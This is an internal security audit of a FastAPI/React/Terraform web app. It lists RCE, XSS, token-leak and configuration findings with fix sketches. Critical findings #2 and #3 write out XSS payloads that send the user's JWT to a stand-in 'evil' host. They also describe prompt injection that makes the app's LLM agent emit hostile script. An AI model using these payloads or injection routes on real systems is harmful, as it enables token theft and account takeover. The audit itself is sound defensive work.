# Phase B Audit — §2 Cross-cutting

Scope: WebSocket protocol, HTTP endpoints, localStorage, env vars, voice/speech,
client-side parsers/exporters, plus cross-cutting Terraform concerns.

Branch: `infra-agent-integration`

---

## CRITICAL (security or data loss)

1. **Server-side RCE: free-form `js_code` body executed by Node subprocess**
   - **File:** `backend/app/api/workflows.py:128-227` and
     `backend/app/services/pptx_export.py:40-180`
   - **Description:** `POST /api/workflows/export-pptx` accepts a `request: dict`
     (no Pydantic schema), pulls `js_code` straight from the body, and hands it
     to `generate_pptx_from_code()` which f-string-interpolates that string into
     a Node script written to `/tmp` and executed with `subprocess.run(["node",
     js_file], ...)`. There is no sandbox other than the 30-second timeout —
     any authenticated user can paste arbitrary Node code (`require("fs")`,
     `require("child_process")`, raw exec, file write, etc.) and the backend
     runs it as the `flowin` user. The "Strategy 2: extract from HTML" branch
     widens this to any `<script>` containing a `generatePresentation()`
     function definition, so even the "use my workflow output" path is
     attacker-controllable.
   - **Impact:** Authenticated RCE on the EC2 host with the application
     instance role (which has `bedrock:Invoke*`, `ssm:GetParameter*` on
     `/flowin/${env}/*`, `kms:Decrypt` against the project CMK, `s3:*` on the
     backup bucket, `cloudwatch:PutMetricData`). Trivially escalates to
     reading every SSM SecureString (`SECRET_KEY`, `DATABASE_PASSWORD`,
     `LANGSMITH_API_KEY`) and dumping Postgres over `127.0.0.1:5432`.
   - **Fix sketch:** Replace the dict body with a Pydantic schema; load Agent 3
     output strictly from the DB by `workflow_id`+`user_id`; never accept
     `js_code` or `html` from the request body. Better: render the .pptx
     server-side from the slide JSON, not from LLM-emitted Node code, and drop
     the subprocess shell-out entirely.

2. **XSS via `dangerouslySetInnerHTML` on user/LLM-influenced markdown**
   - **File:** `frontend/src/components/preview/UserStoryPreview.tsx:217-225`
   - **Description:** Acceptance-criteria text is run through string `replace`
     calls and then injected via `dangerouslySetInnerHTML`. The "criterion"
     value is whatever the LLM emits (which the user influences with the
     refinement prompt), and prompt-injection of the form
     `<img src=x onerror=fetch('https://evil/?='+localStorage.auth_token)>`
     reaches the DOM unfiltered. The pattern replaces a few literal `Given/
     When/Then` tokens; everything else passes through verbatim.
   - **Impact:** Stored XSS in the authenticated dashboard. Auth token lives in
     `localStorage` (see §`frontend/src/lib/api.ts:18-24`), so an XSS payload
     can exfiltrate the JWT and call every authenticated endpoint until the
     token's 24h expiry. CSP in prod nginx allows `script-src 'unsafe-inline'
     'unsafe-eval'` (bootstrap-ec2.sh:602) so the CSP does not block the
     payload.
   - **Fix sketch:** Render Given/When/Then as React nodes (slice the string,
     wrap matches in `<span>`). Never call `dangerouslySetInnerHTML` on
     LLM-produced strings. Independent: stop storing the JWT in
     `localStorage` (move to httpOnly cookie or in-memory state with refresh).

3. **Prototype/PPT iframes use `sandbox="allow-scripts allow-same-origin"`**
   - **File:** `frontend/src/components/preview/PrototypePreview.tsx:105` and
     `frontend/src/components/preview/PPTPreview.tsx:162`
   - **Description:** The prototype HTML is LLM-generated and rendered with
     `srcDoc` inside an iframe whose sandbox includes both `allow-scripts` AND
     `allow-same-origin`. MDN explicitly warns this combination is equivalent
     to no sandbox at all — script in the iframe can read parent
     `document.cookie` / `localStorage` because the origins match. Same iframe
     pattern in `PPTPreview` (line 162).
   - **Impact:** Authenticated prompt-injection-driven XSS: a malicious user
     story prompt can make the prototype agent emit
     `<script>fetch('https://evil/?j='+parent.localStorage.auth_token)</script>`
     and exfiltrate the JWT. Same blast radius as finding #2.
   - **Fix sketch:** Drop `allow-same-origin`. Either accept that scripts in
     prototype previews can't reach `parent` (intended sandbox), or render
     into a separate-origin blob URL with `target="_blank"` so the parent
     window is unreachable by design.

4. **Mass-role injection on `PUT /api/chats/{chat_id}/messages`**
   - **File:** `backend/app/api/chats.py:28-32, 162-196`
   - **Description:** `AddMessageRequest.role` defaults to `"user"` but accepts
     any string. The handler at line 186 writes `request.role` verbatim into
     `messages.role` — no enum, no validation against
     `{"user","assistant","system"}`. A caller can post a message with
     `role="assistant"` to seed a fake assistant response that the dashboard's
     chat reload will render as if Claude said it.
   - **Impact:** Trust-boundary subversion: an attacker controlling one user
     account can write content the UI presents as the assistant's. Combined
     with finding #2, the injected "assistant" message can contain XSS.
     Stored persistence (not just one render) escalates this.
   - **Fix sketch:** Make `role` a `Literal["user"]` (or, if assistant writes
     are needed in tests, restrict to `user` for this public endpoint and add a
     separate internal path).

5. **JWT echoed in `Sec-WebSocket-Protocol` response when client offers only `bearer.<jwt>`**
   - **File:** `backend/app/api/websocket.py:156-158`
   - **Description:** This expands the Phase-A finding. When the client offers
     only `bearer.<jwt>` (no `flowin.v1` selector), the server falls through to
     `echo_subprotocol = f"bearer.{token}"` and echoes the JWT back in the
     WebSocket handshake response header. Today the official frontend always
     offers both, but the comment ("If a client only offered the credential …
     we degrade by echoing the credential too") admits the risk. Any proxy
     between the EC2 box and the browser that logs response headers (an
     enterprise WAF, a CDN tracing tier, a future ALB access log) captures
     the JWT.
   - **Impact:** JWT leaked to upstream log infrastructure for any client that
     omits the selector subprotocol. 24h JWT means up to 24h of replay.
   - **Fix sketch:** Reject the connection (close 4001) when the client
     offered only `bearer.*`. There is no legitimate client today that needs
     the degrade path; deleting it costs nothing.

---

## HIGH (correctness bugs)

1. **Per-message JWT re-validation skipped for `run_pipeline` /
   `cancel_pipeline` / `generate_questions`**
   - **File:** `backend/app/api/websocket.py:209-269`
   - **Description:** The `user_message` branch (line 280) re-decodes the
     token before every message to honour `/logout` revocations and password-
     change blanket revocations. The other three branches reuse the `user`
     captured at connection-accept time. So a revoked JWT can still drive
     `run_pipeline` (consumes Bedrock $$), `cancel_pipeline` (state-mutation),
     and `generate_questions` (Bedrock call) until the WebSocket itself
     closes.
   - **Impact:** Logout/blanket-revoke does not actually stop in-flight
     attackers from running pipelines. Defeats the per-token revocation work
     done in `app.core.dependencies`.
   - **Fix sketch:** Hoist the `_authenticate_token(token, db)` call to the
     top of every iteration of the receive loop, before the type-switch.

2. **No max length on `password`, `email`, `content`, `title`, `input`, etc.**
   - **File:** `backend/app/models/schemas.py` (all schemas);
     `backend/app/api/chats.py:22-32`; `backend/app/api/workflows.py:21-37`;
     `backend/app/api/auth.py:146-149`
   - **Description:** `RegisterRequest.password` has only `min_length=8`. No
     schema in the codebase uses `max_length` (`grep -r "max_length" backend`
     returns nothing). The `ChangePasswordRequest` schema doesn't validate
     length on `new_password` until inside the handler (8-char floor only),
     and never caps the upper bound. `CreateChatRequest.title`,
     `CreateWorkflowRequest.input`, `AddMessageRequest.content`, all
     unbounded.
   - **Impact (1):** bcrypt **silently truncates** to 72 bytes. A user who
     sets a 200-char password authenticates if the first 72 bytes match —
     surprising and probably not what either party wanted.
   - **Impact (2):** DoS by 100MB JSON body. Nginx caps at `client_max_body_
     size 1m` in production (bootstrap-ec2.sh:579), but local-dev uvicorn
     has no body cap at all and the prod limit is one config edit from being
     wrong. Defence-in-depth requires Pydantic max_length.
   - **Fix sketch:** Add `max_length=` per field: passwords cap at 72,
     titles ≤200, message content ≤32000, workflow input ≤10000. Apply
     `max_length` to every schema.

3. **No application-level rate limit on `/api/auth/login` or `/register`
   (mitigation is nginx-only, not present in local dev)**
   - **File:** `backend/app/main.py:107-121`; `infra/scripts/bootstrap-ec2.sh:514-518`
   - **Description:** Phase A flagged the missing rate-limit on `/login` and
     `/register`. Confirmed at the application layer: no slowapi / fastapi-
     limiter / Redis token bucket. The only protection is nginx
     `limit_req_zone flowin_login rate=10r/m burst=5` and `flowin_register
     rate=5r/m burst=3` set in the production bootstrap script. If a future
     deployment doesn't go through `bootstrap-ec2.sh` (Kubernetes, dev
     instance, anything behind a different reverse proxy), the protection
     vanishes silently.
   - **Impact:** Credential-stuffing against `/login` and account-creation
     spam against `/register` are limited only by the deployment-time nginx
     config. Local-dev allows unlimited tries; CI/integration test
     environments are similarly exposed.
   - **Fix sketch:** Add slowapi-based per-IP rate limit at the FastAPI layer
     (5/min on `/login` and `/register`, 10/min on `/change-password`). Keep
     nginx limits as defence-in-depth.

4. **CORS middleware ignores `settings.CORS_ORIGINS`**
   - **File:** `backend/app/main.py:115-121`
   - **Description:** `Settings.CORS_ORIGINS` is defined and loaded
     (`backend/app/core/config.py:75`) but the FastAPI app hardcodes
     `allow_origins=["http://localhost:3000", "http://127.0.0.1:3000",
     "http://localhost:3001"]`. The settings field is dead code.
   - **Impact:** In any deployment whose frontend isn't on
     `localhost:3000`, the CORS handshake will fail for cross-origin
     requests. Operators changing `CORS_ORIGINS` in `.env` / SSM see no
     effect — silent misconfiguration. Note that prod nginx hides this
     because both API and FE share an origin; staging or split-origin setups
     break.
   - **Fix sketch:** Replace the hardcoded list with `settings.CORS_ORIGINS`
     and remove the localhost defaults from the source (push them into
     `.env.development` template).

5. **No WebSocket message-size or per-user-connection cap**
   - **File:** `backend/app/api/websocket.py:92-462`
   - **Description:** No `max_size` is set on `websocket.receive_text()`. No
     accounting structure tracks open sockets per `user.id`. A single
     authenticated user can open hundreds of WebSockets and stream
     `user_message` payloads of arbitrary size — uvicorn's default cap is
     16 MiB per frame and there's no upstream limit either (nginx WS path
     at `infra/scripts/bootstrap-ec2.sh:646-659` doesn't apply
     `client_max_body_size`).
   - **Impact:** Trivial DoS — keep N sockets open, each ingesting and
     re-emitting megabytes per second to the same Postgres + Bedrock
     pipeline. Bedrock spend amplification ($$/minute) and per-instance
     memory exhaustion.
   - **Fix sketch:** Cap WS frame size with `max_size=2**18` (256 KiB),
     maintain a `dict[user_id, set[WebSocket]]` in module state, reject
     accept when the user already has >3 connections.

6. **`questionnaire` JSON re-parse on LLM output uses unbounded regex**
   - **File:** `backend/app/api/websocket.py:744-747`
   - **Description:** `json_match = re.search(r'\{[\s\S]*\}', response)`. The
     `\{[\s\S]*\}` pattern is greedy across the whole LLM response — if
     malformed output is very long, the match-then-`json.loads` chain on a
     >10 MB string blocks the event loop. Tied to the absence of input
     bounds in finding HIGH-2.
   - **Impact:** Slow handler on pathological output; secondary to other
     issues but on the event loop.
   - **Fix sketch:** Make the regex non-greedy and bound it
     (`r'\{[\s\S]{0,100000}?\}'`).

7. **GET / DELETE `/api/agents/skills/{agent_id}` don't validate `agent_id`
   against the registry**
   - **File:** `backend/app/api/agents.py:151-209` (POST validates;
     GET line 162 and DELETE line 208 do not)
   - **Description:** The POST handler calls `get_agent_by_id(request.
     agent_id)` and rejects unknown IDs. The GET and DELETE handlers go
     straight to `read_user_skill(agent_id, ...)` / `delete_custom_skill(...)`
     which construct `USER_SKILLS_DIR / user_id / agent_id / "SKILL.md"`. With
     `agent_id=".."` (URL-decoded in a single path segment, accepted by
     FastAPI's default `{agent_id}` matcher), the resolved path is
     `USER_SKILLS_DIR / user_id / SKILL.md` — outside the per-agent
     subdirectory the user is supposed to own. With a sequence that survives
     URL routing the user can drop an empty-string read at the user's root
     directory.
   - **Impact:** Limited blast radius today because the user is still scoped
     to their own subtree (the `user_id` segment is fixed by JWT), but the
     invariant the POST handler enforces is broken on the GET/DELETE side. A
     misnamed file in the user's namespace becomes deletable, which is enough
     to corrupt the persisted skill set if the storage layout ever grows
     siblings to the per-agent dir.
   - **Fix sketch:** Apply the same `get_agent_by_id(agent_id)` check (or a
     stricter path-allowlist regex on the path parameter using
     `Path(..., regex=r"^[a-z0-9-]+$")`) to GET and DELETE.

8. **`useWebSocket` debug `console.log` calls still in production bundle**
   - **File:** `frontend/src/hooks/useWebSocket.ts:70, 178`
   - **Description:** Phase A note expanded. The log strings don't print the
     token value (just `"present"/"null"`), but they DO read
     `localStorage.getItem("auth_token")` inside the log expression. The
     calls run in production builds because there is no `process.env.NODE_
     ENV` guard. Any browser extension that hooks `console.log` arguments
     observes the read (and any future regression to printing the value goes
     unnoticed).
   - **Impact:** Side-channel for browser extensions; minor on its own,
     compounds with #2/#3 XSS.
   - **Fix sketch:** Delete the `console.log` calls, or wrap in
     `if (process.env.NODE_ENV !== 'production')`.

---

## MEDIUM (perf, UX, maintainability)

1. **`Web Speech API` (`SpeechRecognition`) silently routes audio to Google
   in Chrome**
   - **File:** `frontend/src/hooks/useSpeechRecognition.ts:69-113`
   - **Description:** Chrome's `webkitSpeechRecognition` ships microphone
     audio to a Google cloud endpoint by default for transcription. The hook
     uses `continuous: true, interimResults: true, lang: "en-US"` — every
     spoken word leaves the browser. No banner, no opt-in, no warning to the
     user that their voice is being processed by a third party.
   - **Impact:** GDPR/data-residency exposure for EU users (project domain
     is `eu-central-1`). Mic input may contain sensitive product ideas being
     dictated.
   - **Fix sketch:** Add a one-time UX banner explaining the third-party
     transcription before first activation; document this behaviour in the
     privacy policy. Long-term: integrate AWS Transcribe via WS so audio
     stays in EU.

2. **`useSpeechRecognition` cleanup races: `recognitionRef.current.abort()`
   in unmount but no guard against double-stop in the `onerror` for `no-
   speech`**
   - **File:** `frontend/src/hooks/useSpeechRecognition.ts:94-99`
   - **Description:** `onerror` for `event.error !== "no-speech"` sets
     `isListening(false)` but does not `recognition.stop()`. On a transient
     mic disconnect, `isListening` desyncs from the underlying recogniser
     state, and subsequent `startListening()` throws `InvalidStateError`
     (caught and logged, but the UI looks "dead" without any failure
     feedback).
   - **Impact:** Mic-button stops responding after a transient error; user
     reload-fixes.
   - **Fix sketch:** In `onerror`, always `recognition.abort()` then update
     state.

3. **`react-markdown` rendered without `rehypeRaw` is safe today, but no
   `skipHtml` / explicit `unsafe` opt-out**
   - **File:** `frontend/src/components/chat/MessageBubble.tsx:322`,
     `frontend/src/components/preview/MarkdownPreview.tsx:58-120`
   - **Description:** `react-markdown` v10 ignores raw HTML by default, so
     `<script>` tokens in the markdown render as text. That is fine, but the
     code does not pin behaviour with `skipHtml` or an explicit configuration
     — a future `rehypeRaw` addition (the standard plugin for "make markdown
     render embedded HTML") would silently enable HTML injection. Defence-
     in-depth: declare the intent.
   - **Impact:** Latent regression risk.
   - **Fix sketch:** Add `<ReactMarkdown skipHtml>` (or document with a
     comment that raw HTML must never be enabled).

4. **`exportPrototype`, `exportUserStories` create blob/`URL.createObjectURL`
   with no size cap**
   - **File:** `frontend/src/lib/exporters/prototypeExporter.ts:16-25`,
     `frontend/src/lib/exporters/storyExporter.ts:6-15`,
     `frontend/src/lib/exporters/pptExporter.ts:107-110`
   - **Description:** Inputs come straight from LLM output. A 50 MB JSON
     prototype string fits cleanly into a `Blob`, but `URL.createObjectURL`
     allocates browser memory and the implicit 5s `setTimeout` on revoke in
     `PrototypePreview.tsx:70` / `PPTPreview.tsx:150` can leave allocated
     buffers alive longer in tab-with-many-runs scenarios.
   - **Impact:** Mobile/laptop memory pressure under heavy use; not a
     security issue, but the LLM-controlled size makes it a free DoS knob.
   - **Fix sketch:** Cap content size (reject >5 MB) before creating the
     blob; raise an inline error.

5. **`pptExporter.ts` casts `pptxgen.ShapeType` / `CHART_NAME` via `as` —
   silent breakage on `pptxgenjs` upgrade**
   - **File:** `frontend/src/lib/exporters/pptExporter.ts:24-26, 31-40`
   - **Description:** Type narrowing is bypassed with `"rect" as pptxgen.
     ShapeType`. If `pptxgenjs` ever renames a shape, the type-check passes
     but runtime fails on slide construction.
   - **Impact:** Hard-to-diagnose runtime regression after dependency
     upgrade.
   - **Fix sketch:** Use the enum values exposed by `pptxgenjs` directly
     instead of string casts.

6. **`parsePPTSlideData` greedy `{ ... }` extraction is O(n) per input but
   produces unpredictable output on dual-`{ }` LLM output**
   - **File:** `frontend/src/lib/parsers/pptParser.ts:15-23`
   - **Description:** `extractJSON` slices from the first `{` to the last
     `}` of the input. If the LLM emits a debug comment containing `{` after
     the slides JSON, the slice catches both and `JSON.parse` throws; the
     fallback `repairTruncatedJSON` then aggressively appends `}`s,
     potentially producing a parseable-but-wrong object.
   - **Impact:** Silent data-loss when the LLM is verbose; users see a
     partial slide deck without an error.
   - **Fix sketch:** Parse with a JSON tokenizer that finds the first
     balanced `{...}` block instead of using indexOf/lastIndexOf.

7. **`StreamMessageModel` Pydantic model declares only 5 types
   (`stream|complete|error|phase_start|phase_end`) but backend emits 19+**
   - **File:** `backend/app/models/schemas.py:71-77`; emitters in
     `backend/app/api/websocket.py:347-351, 633-643, 748-769` and
     `backend/app/agents/orchestrator_v2.py:281-391`
   - **Description:** The schema model in `schemas.py` exists but is never
     actually used to validate outgoing WS messages — `websocket.send_json`
     accepts any dict. The `Literal[...]` enum is missing `title_update`,
     `workflow_title_update`, `pipeline_start`, `agent_*`, `pipeline_
     complete`, `pipeline_cancelled`, `questionnaire`, `step`. Phase A
     identified the FE side (`parseStreamMessage` whitelist of 5 is dead);
     the BE side mirrors that same stale enum.
   - **Impact:** Dead schema. Maintenance trap: a future contributor adding
     a `StreamMessageModel` validator will reject 70% of legitimate WS
     traffic.
   - **Fix sketch:** Either delete the model or expand the literal and wire
     it as a `pydantic.TypeAdapter` validator on every `send_json` call.

8. **Backend emits "deprecation warning" log for `?token=` path every WS
   open, but log carries no client identifier (IP, UA)**
   - **File:** `backend/app/api/websocket.py:137-140`
   - **Description:** The warning includes the literal text "WebSocket auth
     via query string ?token= is deprecated" but doesn't include the IP /
     User-Agent of the offending client. So "which client is still using the
     deprecated path?" cannot be answered from logs.
   - **Impact:** Operator can never confidently delete the deprecated path
     because they can't prove no client is using it.
   - **Fix sketch:** Include `websocket.client.host` and the
     `User-Agent` header in the warning.

9. **`logout` POST sends no `Content-Type` header; backend tolerates this
   only because the handler reads `Authorization` directly**
   - **File:** `frontend/src/lib/api.ts:47-54`
   - **Description:** `fetch(..., { method: "POST", headers: { Authorization
     : ... } })` — no body, no `Content-Type`. Works against FastAPI today
     because the route ignores the body, but is non-idiomatic and is exactly
     the kind of "but it worked locally" call that a CSRF-protection
     middleware would inadvertently reject.
   - **Impact:** Latent fragility; minor.
   - **Fix sketch:** Add `Content-Type: application/json` and an empty `{}`
     body for consistency.

10. **`auth_token` in `localStorage` is read by `useWebSocket` AFTER `cleanup
    + intentionalCloseRef = false` is set, opening a small race**
    - **File:** `frontend/src/hooks/useWebSocket.ts:68-80, 175-191`
    - **Description:** `connect()` calls `cleanup()` then sets
      `intentionalCloseRef.current = false` then reads `currentToken =
      getToken()`. If `cleanup()` fires `onclose` synchronously (browsers
      can), the close handler's reconnect-with-backoff path can fire before
      the next connect attempt completes — visible as a "reconnecting"
      flicker. Not a security issue but pointed-out by the audit brief.
    - **Impact:** UX flicker, occasional dropped first message in a fast
      reconnect.
    - **Fix sketch:** Set `intentionalCloseRef.current = true` before calling
      `cleanup()` so the close path doesn't race with the new connect.

---

## LOW (code smell, docs)

1. **`StreamMessage` TypeScript union has 19 entries; `parseStreamMessage`
   whitelist has 5 (Phase A note expanded)**
   - **File:** `frontend/src/lib/parsers/streamParser.ts:3`,
     `frontend/src/types/index.ts:36`
   - Already known; the union vs. whitelist drift is the maintenance
     fingerprint. Recommendation: derive the runtime whitelist from the TS
     literal union via a generated constant.

2. **Dashboard `JSON.parse` of `final_output` swallows errors silently**
   - **File:** `frontend/src/app/dashboard/page.tsx:464-479`
   - **Description:** The chat-detail load tries `JSON.parse(chatDetail.
     final_output)` inside a try/catch that does nothing on failure. A user
     who hits a malformed session quietly sees an empty preview with no
     indication why.
   - **Fix sketch:** Surface a non-blocking warning toast when parse fails.

3. **`backend/app/api/agents.py:128` uses `useState(() => …)` as a
   "did-mount" hack** (frontend, miscategorised in the import)
   - **File:** `frontend/src/components/workflow/SkillManager.tsx:128`
   - **Description:** Uses `useState(() => { if (isOpen && agentId)
     loadSkill(); })` — this is a side-effect inside a state initialiser.
     Re-runs only on remount; React 18+ Strict Mode runs initialisers twice
     in dev, calling `loadSkill()` twice.
   - **Fix sketch:** Replace with `useEffect(...)` with `[isOpen,
     agentId]` deps.

4. **Backend prints `[WS] Connection accepted via ...` and `[WS]
   Authenticated user=...` via `print()` rather than the logger**
   - **File:** `backend/app/api/websocket.py:161, 177, 211`
   - **Description:** These bypass the project's logging format and don't
     show up in the structured `app` log group filter.
   - **Fix sketch:** Replace `print` with `logger.info`.

5. **`logout` handler returns 204 even when the JWT was invalid (token
   already expired)**
   - **File:** `backend/app/api/auth.py:93-143`
   - **Description:** Intentional idempotence per the docstring, but it
     means an attacker who sniffed a token CAN'T tell whether their target
     ever logged out — which is actually the right call. Flagging as docs
     to make sure the next reader doesn't "fix" it.
   - **Fix sketch:** Add a comment explicitly tagging this as intentional
     idempotence, not a bug.

6. **`env-templates/.env.development:28` defaults `SECRET_KEY` to
   `"dev-secret-change-this-to-random-string"` which is exactly 41 chars and
   passes the `_MIN_SECRET_KEY_LENGTH=32` check**
   - **File:** `env-templates/.env.development:28`;
     `backend/app/core/config.py:43-135`
   - **Description:** The length check passes a placeholder string, so a
     developer who copies this template into `.env` and forgets to rotate
     gets no warning. The dedicated default-string match (`_DEFAULT_SECRET_
     KEY = "dev-secret-key-change-in-production"`) doesn't catch THIS
     template's value because the strings differ.
   - **Fix sketch:** Add `"dev-secret-change-this-to-random-string"` to a
     "known-weak-defaults" set in `config.py`, or make the template emit
     `SECRET_KEY=` with a clear "MUST_SET" sentinel that fails validation.

7. **`app.env.example:23` defaults `SECRET_KEY=replace-with-32-or-more-...`
   — 60 chars, passes validation**
   - **File:** `app.env.example:23`
   - Same class of issue as #6: placeholder is long enough to satisfy the
     boot guard.

8. **`access_token_expire_hours` defaults to 24 in code, 12 in prod env
   template, 12 in `infra/modules/secrets/variables.tf:80`**
   - **File:** `backend/app/core/config.py:76`,
     `env-templates/.env.production.example:25`,
     `infra/modules/secrets/variables.tf:73-82`
   - **Description:** Three sources of truth disagree. The 12 in TF is the
     applied value in prod; the 24 in code is the dev fallback. Not wrong,
     just confusing.
   - **Fix sketch:** Pick one default, comment on the others.

9. **`backend/app/api/websocket.py:161` accepts subprotocol BEFORE
   validating token**
   - **File:** `backend/app/api/websocket.py:148-174`
   - **Description:** The accept happens at line 158, the token validation
     at line 166. Browsers see "handshake succeeded" briefly even for
     invalid tokens; the close arrives a few ms later. Cosmetic: doesn't
     allow any data exchange, but slightly leaks "your token is being
     processed" timing.
   - **Fix sketch:** Move validation earlier (decode-only check, no DB
     lookup) so close-before-accept is possible for obviously-invalid
     tokens.

---

## TF concerns

1. **SNS topic policies use PascalCase enumerated actions (not
   lowercase) — re-verified per task brief**
   - **File:** `infra/modules/monitoring/main.tf:120-144, 286-311`
   - **Description:** The task brief said "re-verify the lowercase
     enumerated actions". Checked: actions are PascalCase
     (`sns:AddPermission`, `sns:Publish`, `sns:Subscribe`, `sns:TagResource`,
     etc.). This matches the AWS API action-name convention; the SNS
     resource-policy validator requires PascalCase. **The current spelling
     is correct.** If a reviewer expected lowercase, that expectation was
     wrong — leave as-is.

2. **KMS key policy: `allow_logs_service` statement uses
   `kms:EncryptionContext:aws:logs:arn = "arn:.../log-group:/flowin/*"` —
   matches every environment, not the current env**
   - **File:** `infra/modules/kms/main.tf:42-69`
   - **Description:** The CMK module is shared across environments by
     design (one CMK per stack), but the EncryptionContext pattern
     `/flowin/*` matches `prod`, `staging`, anything. If a future
     environment ever shares this CMK, log groups across environments
     become mutually decryptable. Minor; the project uses one CMK per
     environment so the pattern is currently correct, but `/flowin/${
     environment}/*` would be tighter.
   - **Fix sketch:** Take `environment` as a KMS module variable and
     scope the EncryptionContext.

3. **SSM SecureString rotation: `lifecycle.ignore_changes = [value]` on
   `app_secret_key` and `db_password` is correct, but `langsmith_*` add
   the same guard on PLAIN strings that aren't sensitive**
   - **File:** `infra/modules/secrets/main.tf:166-213`
   - **Description:** `langsmith_tracing` and `langsmith_project` are
     plain-text toggles (`true|false`, `flowin-prod`). They're guarded
     with `ignore_changes = [value]` "for symmetry with the API-key SSM
     param above" per the comment, but that means a TF-driven change to
     the project name DOES NOT apply on apply. The operator has to manually
     edit the parameter and TF won't notice.
   - **Fix sketch:** Drop `ignore_changes` for the two non-sensitive
     parameters.

4. **No SSM parameter for `BEDROCK_INFERENCE_PROFILE_ID`**
   - **File:** `backend/app/core/config.py:70` declares it;
     `infra/modules/secrets/main.tf:90-100` exports `llm/model_id` and
     `llm/region` but not the inference profile.
   - **Description:** The application uses the inference profile as its
     CloudWatch dimension key. With no SSM source, the production
     `BEDROCK_INFERENCE_PROFILE_ID` falls back to the hardcoded default
     in `config.py:70` — fine today but a hidden coupling. The bedrock-
     throttles alarm in `monitoring/main.tf:543` keys on `var.bedrock_
     model_id` which is `effective_model_id` (the inference profile), so
     if the two ever drift the alarm goes silent.
   - **Fix sketch:** Add `llm/inference_profile_id` to the secrets module
     and surface it through `flowin-load-secrets`.

5. **`ssm-read.json` resource scope is `parameter/flowin/${environment}`
   and `parameter/flowin/${environment}/*` — but the secrets module writes
   under `/flowin/${environment}/llm/` (nested namespace). The trailing
   `/*` allows recursive `GetParametersByPath` which is what the loader
   uses.**
   - **File:** `infra/policies/ssm-read.json:11-13`,
     `infra/modules/secrets/main.tf:1` (prefix)
   - **Description:** Re-verified: the `/*` wildcard covers nested paths.
     No issue, but worth noting that adding sibling subtrees (e.g.
     `/flowin/${environment}/external-api/`) would automatically inherit
     instance read access — could be intended, could be a foot-gun.

6. **`infra/modules/kms/main.tf:71-83` SNS service grant: the condition
   block restricts NOTHING (no SourceAccount, no SourceArn)** [VERIFY]
   - **File:** `infra/modules/kms/main.tf:71-83`
   - **Description:** The `AllowSns` statement permits `kms:Decrypt` and
     `kms:GenerateDataKey` to `sns.amazonaws.com` with no condition. The
     S3 statement (line 85-103) and Backup statement (104-137) both
     constrain by `aws:SourceAccount`. The SNS branch does not. So any
     SNS topic in any AWS account that targets this CMK could decrypt —
     no, wait: the KMS service principal grant is bounded by which topics
     reference this CMK (they have to be in the same account to do so via
     `kms_master_key_id`). Still, the pattern asymmetry between SNS and
     the other services is a tripwire — flag for explicit Source*
     conditions.
   - **Impact:** Defence-in-depth gap; not exploitable today.
   - **Fix sketch:** Add `aws:SourceAccount = var.account_id` condition
     to the SNS branch, matching S3/Backup.

7. **No KMS deletion-protection on the CMK, but `aws_kms_alias` is not
   `prevent_destroy`** [VERIFY]
   - **File:** `infra/modules/kms/main.tf:160-173`
   - **Description:** The key has `prevent_destroy = true` (line 161),
     the alias does not. Operators sometimes `terraform destroy -target`
     the alias to break a dependency; doing so leaves the key orphaned
     and breaks every consumer that references it by alias.
   - **Fix sketch:** Add `prevent_destroy = true` to the alias.

8. **`env-templates/.env.frontend` does not specify the protocol mismatch
   for `wss://` vs `ws://` in prod** (docs)
   - **File:** `env-templates/.env.frontend:8-12`
   - **Description:** Production example uses `wss://` (line 12), which is
     correct since nginx terminates TLS. The dev example uses `ws://`
     (line 8). If a developer copies the prod example for staging-on-
     http, the WS will fail in a confusing way. Minor docs nit.

9. **`infra/modules/monitoring/main.tf:81-89` `aws_sns_topic.alerts` has
   `kms_master_key_id = var.kms_key_arn` but the KMS key's SNS principal
   grant (kms/main.tf:71-83) is guarded by `var.allow_sns_service`.
   If `allow_sns_service` is false for any env, alerts publication breaks
   silently.** [VERIFY]
   - **File:** `infra/modules/monitoring/main.tf:81-89`,
     `infra/modules/kms/main.tf:71-83`
   - **Description:** Cross-module coupling. A future operator who sets
     `allow_sns_service = false` to harden the CMK in a dev env will find
     that backup-job and CloudWatch alarms can no longer publish to the
     encrypted alerts topic. The error message is opaque
     (`InvalidParameter`-style). Worth documenting the coupling or making
     it impossible to misconfigure (force `allow_sns_service = true` when
     monitoring uses the CMK).
   - **Fix sketch:** Document the coupling, or add a TF validation in
     `monitoring/variables.tf` that fails fast.

---

## Summary statistics
- CRITICAL: 5
- HIGH: 8
- MEDIUM: 10
- LOW: 9
- TF: 9
- Total new findings: **41**
- Phase A confirmed (not re-listed): 9
